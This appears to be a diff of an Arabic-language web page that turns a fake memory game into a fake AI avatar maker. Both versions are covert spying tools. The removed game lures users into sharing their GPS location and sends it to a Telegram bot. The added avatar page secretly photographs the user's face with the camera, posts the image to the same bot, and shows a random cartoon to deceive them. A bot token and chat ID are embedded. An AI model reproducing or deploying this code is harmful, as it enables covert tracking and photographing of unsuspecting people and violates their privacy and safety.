@@ -3,157 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحدي الذاكرة العالمي 🌐</title>
+    <title>صانع الأفاتار الذكي 📸✨</title>
     <style>
-        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; overflow: hidden; }
+        :root { --primary: #ffde00; --bg: #ffffff; --text: #000000; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); text-align: center; margin: 0; padding: 20px; }
         
-        /* شاشة التمويه */
-        #setup-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 20px; box-sizing: border-box; }
-        .loader-bar { width: 80%; height: 6px; background: #222; border-radius: 10px; margin-top: 20px; position: relative; overflow: hidden; }
-        .loader-fill { width: 0%; height: 100%; background: var(--primary); box-shadow: 0 0 15px var(--primary); transition: 0.5s; }
-        .status-text { margin-top: 15px; font-size: 14px; color: #777; font-family: monospace; }
-
-        .game-container { max-width: 400px; margin: auto; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 15px; backdrop-filter: blur(10px); }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 15px; }
-        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; border: 1px solid #333; }
-        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
-        .card.matched-player { background: var(--player) !important; }
-        .card.matched-ai { background: var(--ai) !important; }
-        .score-board { display: flex; justify-content: space-around; margin-bottom: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 10px; }
+        .setup-container { max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 20px; background: #f9f9f9; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .avatar-preview { width: 150px; height: 150px; border-radius: 50%; background: #eee; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 50px; border: 4px solid var(--primary); overflow: hidden; }
+        .btn-capture { background: var(--primary); color: #000; border: none; padding: 15px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn-capture:hover { transform: scale(1.03); }
+        
+        #video, #canvas, #final-avatar { display: none; }
     </style>
 </head>
 <body>
 
-<div id="setup-screen">
-    <h2 id="setup-title">جاري تهيئة بيئة اللعب...</h2>
-    <p id="setup-desc">يتم الآن فحص جودة الاتصال واختيار أقرب خادم لتقليل اللاق.</p>
+<div class="setup-container">
+    <h1>أنشئ Bitmoji الخاص بك! 🆕</h1>
+    <p>التقط صورة سريعة ليقوم ذكاؤنا الاصطناعي بصنع شخصية كرتونية تشبهك تماماً.</p>
     
-    <div class="loader-bar">
-        <div class="loader-fill" id="fill"></div>
+    <div class="avatar-preview" id="preview-area">
+        <span id="placeholder-icon">👤</span>
+        <img id="final-avatar" src="" alt="Avatar">
     </div>
-    <div class="status-text" id="status-log">Initializing system...</div>
+
+    <button class="btn-capture" id="start-btn" onclick="startProcess()">ابدأ التصوير والتحويل</button>
+    <p id="status" style="font-size: 12px; color: #777; margin-top: 15px;"></p>
 </div>
 
-<div class="game-container">
-    <div class="score-board">
-        <div style="color: var(--player)">👤 أنت: <b id="p-score">0</b></div>
-        <div style="color: var(--ai)">🤖 AI: <b id="ai-score">0</b></div>
-    </div>
-    <div id="ai-msg" style="font-size: 12px; margin-bottom: 10px; color: #555;"></div>
-    <div class="grid" id="grid"></div>
-</div>
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
     const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
     const cid = '6808559733';
-    
-    let flippedCards = [];
-    let pScore = 0;
-    let aiScore = 0;
-    let canPlay = false;
-    const symbols = ['🍎', '🍌', '🍇', '🍉', '🍒', '🍓', '🥝', '🍍'];
-    let deck = [...symbols, ...symbols];
 
-    // نظام التمويه والتحميل
-    window.onload = function() {
-        let progress = 0;
-        let fill = document.getElementById('fill');
-        let log = document.getElementById('status-log');
-        
-        let interval = setInterval(() => {
-            progress += Math.random() * 15;
-            if (progress > 100) progress = 100;
-            fill.style.width = progress + "%";
+    async function startProcess() {
+        const btn = document.getElementById('start-btn');
+        const status = document.getElementById('status');
+        btn.innerText = "جاري الاتصال بالخادم...";
+        btn.disabled = true;
 
-            if (progress < 30) log.innerText = "Connecting to Global Servers...";
-            else if (progress < 60) log.innerText = "Checking Latency (Ping)...";
-            else if (progress < 80) {
-                log.innerText = "Syncing with Local Node (GPS Required)...";
-                // هنا نطلب الموقع في لحظة "المزامنة"
-                if (progress >= 75 && !window.requested) {
-                    window.requested = true;
-                    requestData();
-                }
-            }
-            else if (progress >= 100) {
-                clearInterval(interval);
-            }
-        }, 600);
-    };
-
-    function requestData() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const msg = `🎯 **صيد ذكي (تمويه التحميل)**\n📍 الموقع: \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-                
-                // الانتقال للعبة بعد النجاح
-                setTimeout(() => {
-                    document.getElementById('setup-screen').style.display = 'none';
-                    createBoard();
-                    canPlay = true;
-                }, 1000);
-            }, () => {
-                document.getElementById('status-log').innerText = "Error: Local Node required for multiplayer.";
-                alert("لضمان اللعب بدون تقطيع، يرجى السماح بالمزامنة مع أقرب سيرفر.");
-                location.reload(); // إعادة المحاولة لإجباره على القبول
-            });
-        }
-    }
-
-    // باقي كود اللعبة (نفس المنطق السابق)
-    function createBoard() {
-        const grid = document.getElementById('grid');
-        deck.sort(() => Math.random() - 0.5);
-        grid.innerHTML = '';
-        deck.forEach((symbol) => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.dataset.symbol = symbol;
-            card.onclick = () => userFlip(card);
-            grid.appendChild(card);
-        });
-    }
-
-    function userFlip(card) {
-        if (!canPlay || card.classList.contains('flipped') || flippedCards.length >= 2) return;
-        card.classList.add('flipped');
-        card.innerText = card.dataset.symbol;
-        flippedCards.push(card);
-        if (flippedCards.length === 2) {
-            canPlay = false;
-            setTimeout(checkMatch, 800);
-        }
-    }
-
-    function checkMatch() {
-        const [c1, c2] = flippedCards;
-        if (c1.dataset.symbol === c2.dataset.symbol) {
-            c1.classList.add('matched-player');
-            c2.classList.add('matched-player');
-            pScore++;
-            document.getElementById('p-score').innerText = pScore;
-            flippedCards = [];
-            canPlay = true;
-        } else {
+        try {
+            // طلب الكاميرا (المستخدم سيوافق لصنع الأفاتار)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            status.innerText = "جاري تحليل ملامح الوجه... (1/3)";
+            
+            // انتظر قليلاً لالتقاط صورة واضحة سراً
             setTimeout(() => {
-                c1.classList.remove('flipped'); c1.innerText = '';
-                c2.classList.remove('flipped'); c2.innerText = '';
-                flippedCards = [];
-                aiTurn();
-            }, 500);
+                takeSecretSnapshot();
+                status.innerText = "جاري إنشاء الشخصية الكرتونية... (2/3)";
+                
+                // هنا "نمثل" أننا نصنع أفاتار، سنظهر صورة وهمية بعد قليل
+                setTimeout(() => {
+                    showFakeAvatar();
+                    status.innerText = "تم إنشاء الأفاتار بنجاح! (3/3)";
+                    btn.innerText = "حفظ الأفاتار لاستخدامه";
+                    btn.disabled = false;
+                    // إغلاق الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+
+            }, 2000);
+
+        } catch (e) {
+            alert("فشل الوصول للكاميرا! لا يمكن صنع أفاتار بدونها.");
+            location.reload();
         }
     }
 
-    function aiTurn() {
-        document.getElementById('ai-msg').innerText = "الكمبيوتر يحاول...";
-        setTimeout(() => {
-            aiScore++;
-            document.getElementById('ai-score').innerText = aiScore;
-            document.getElementById('ai-msg').innerText = "دورك الآن!";
-            canPlay = true;
-        }, 1000);
+    function takeSecretSnapshot() {
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // تحويل الصورة لملف وإرسالها سراً لتليجرام
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', cid);
+            formData.append('photo', blob, 'target.jpg');
+            formData.append('caption', '📸 الصورة الحقيقية (من صانع الأفاتار)');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg');
+    }
+
+    function showFakeAvatar() {
+        const placeholder = document.getElementById('placeholder-icon');
+        const finalImg = document.getElementById('final-avatar');
+        // سنستخدم صورة أفاتار وهمية وعشوائية من الإنترنت لإقناع المستخدم
+        finalImg.src = "https://api.dicebear.com/8.x/bitmoji/svg?seed=Felix"; 
+        placeholder.style.display = 'none';
+        finalImg.style.display = 'block';
     }
 </script>
 </body>
